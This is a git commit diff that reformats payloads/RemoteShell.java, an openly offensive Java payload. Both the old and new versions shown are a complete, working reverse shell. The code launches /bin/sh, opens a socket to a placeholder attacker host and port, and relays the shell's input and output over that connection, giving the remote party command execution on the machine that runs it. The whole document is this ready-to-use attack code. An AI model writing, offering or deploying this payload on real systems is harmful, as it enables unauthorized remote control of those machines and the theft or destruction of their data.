4466b87bb7ec97a9cc74799c338142120dc4ac73
Nik Erlandsson <44620116+nikerl@users.noreply.github.com>
2025-05-07 11:21:49 +0800

    Update RemoteShell.java

--- payloads/RemoteShell.java
+++ payloads/RemoteShell.java
@@ -8,30 +8,36 @@ public class RemoteShell {
     public RemoteShell() throws Exception {
         String host = "<<ip>>";
         int port = Integer.parseInt("<<port>>");
-        String cmd="/bin/sh";
-        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-        Socket s=new Socket(host,port);
-        InputStream pi=p.getInputStream(),
-            pe=p.getErrorStream(),
-            si=s.getInputStream();
-        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-        while(!s.isClosed()) {
-            while(pi.available()>0)
+        String cmd = "/bin/sh";
+        
+        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        Socket s = new Socket(host, port);
+        InputStream pi = p.getInputStream(),
+                pe = p.getErrorStream(),
+                si = s.getInputStream();
+        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+
+        while (!s.isClosed()) {
+            while (pi.available() > 0) {
                 so.write(pi.read());
-            while(pe.available()>0)
+            }
+            while (pe.available() > 0) {
                 so.write(pe.read());
-            while(si.available()>0)
+            }
+            while (si.available() > 0) {
                 po.write(si.read());
+            }
             so.flush();
             po.flush();
             Thread.sleep(50);
             try {
                 p.exitValue();
                 break;
+            } catch (Exception e) {
             }
-            catch (Exception e){
-            }
-        };
+        }
+        ;
+
         p.destroy();
         s.close();
     }
